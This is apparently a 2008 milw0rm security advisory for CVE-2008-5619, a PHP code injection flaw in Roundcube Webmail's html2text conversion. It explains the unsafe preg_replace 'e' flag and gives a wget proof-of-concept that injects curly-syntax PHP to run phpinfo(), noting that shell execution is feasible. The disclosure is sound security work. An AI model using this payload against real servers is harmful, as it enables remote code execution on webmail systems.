@@ -1,0 +1,67 @@
+Public Release Date of POC: 2008-12-22
+Author: Jacobo Avariento Gimeno (Sofistic)
+CVE id: CVE-2008-5619
+Bugtraq id: 32799
+Severity: Critical
+Vulnerability reported by: RealMurphy
+
+
+Intro
+----
+Roundcube Webmail is a browser-based IMAP client that uses
+"chuggnutt.com HTML to Plain Text Conversion" library to convert
+HTML text to plain text, this library uses the preg_replace PHP
+function in an insecure manner.
+
+Vulnerable versions:
+Round Cube RoundCube Webmail 0.2-3 beta
+Round Cube RoundCube Webmail 0.2-1 alpha (tested)
+
+
+Analysis of the vulnerable code
+----
+The script bin/html2text.php creates an instance of the class html2text
+with the given POST data, the problem arises in the file
+program/lib/html2text.php in function _convert() on line 381:
+
+        // Run our defined search-and-replace
+        $text = preg_replace($this->search, $this->replace, $text);
+
+Some patterns in $this->search allow interpret PHP code using the "e"
+flag, i.e.:
+'/<a [^>]*href=("|\')([^"\']+)\1[^>]*>(.+?)<\/a>/ie', // <a href="">
+'/<b[^>]*>(.+?)<\/b>/ie',                // <b>
+'/<th[^>]*>(.+?)<\/th>/ie',              // <th> and </th>
+
+In concrete those would be replaced by:
+'$this->_build_link_list("\\2", "\\3")', // <a href="">
+'strtoupper("\\1")',                    // <b>
+"strtoupper(\"\t\t\\1\n\")",            // <th> and </th>
+
+Now using PHP complex (curly) syntax we can take advantage of this to
+interpret arbitrary PHP code, evaluating PHP code embedded inside
+strings.
+
+
+Proof of Concept
+----
+As this vulnerability was discovered in-the-wild:
+http://trac.roundcube.net/ticket/1485618 was quite sure that would be
+exploitable, using PHP curly we can execute phpinfo():
+
+wget -q --header="Content-Type: ''" \
+-O - --post-data='<b>{${phpinfo()}}</b>' \
+--no-check-certificate \
+http://127.0.0.1/roundcubemail-0.2-alpha/bin/html2text.php
+
+Using PHP curly syntax plus some tricks to bypass PHP magic_quotes_gpc
+to avoid using single or double quotes the arbitrary shell command
+execution is fully feasible. As this vulnerability was discovered last
+week no more details will be published yet, more info will be available
+at http://sofistic.net.
+
+
+
+-- Jacobo Avariento Gimeno IT Security Department @ Sofistic Your security, our concern! http://sofistic.net 
+
+# milw0rm.com [2008-12-22]
